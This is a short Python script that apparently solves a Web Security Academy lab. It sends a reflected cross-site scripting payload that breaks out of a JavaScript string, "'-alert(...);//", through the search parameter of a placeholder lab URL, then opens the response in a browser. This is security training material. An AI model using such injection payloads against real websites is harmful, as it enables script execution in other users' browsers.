import requests
import webbrowser

base_url = 'https://LAB-ID.web-security-academy.net/' # Replace with your actual lab ID
payload = "'-alert('SemZ');//"
final_url = f"{base_url}?search={payload}"

response = requests.get(final_url)

print("Response Status:", response.status_code)
if response.status_code == 200:
    print("Payload successfully submitted!")
    print(response.url)
    webbrowser.open(response.url)
else:
    print("Something went wrong.")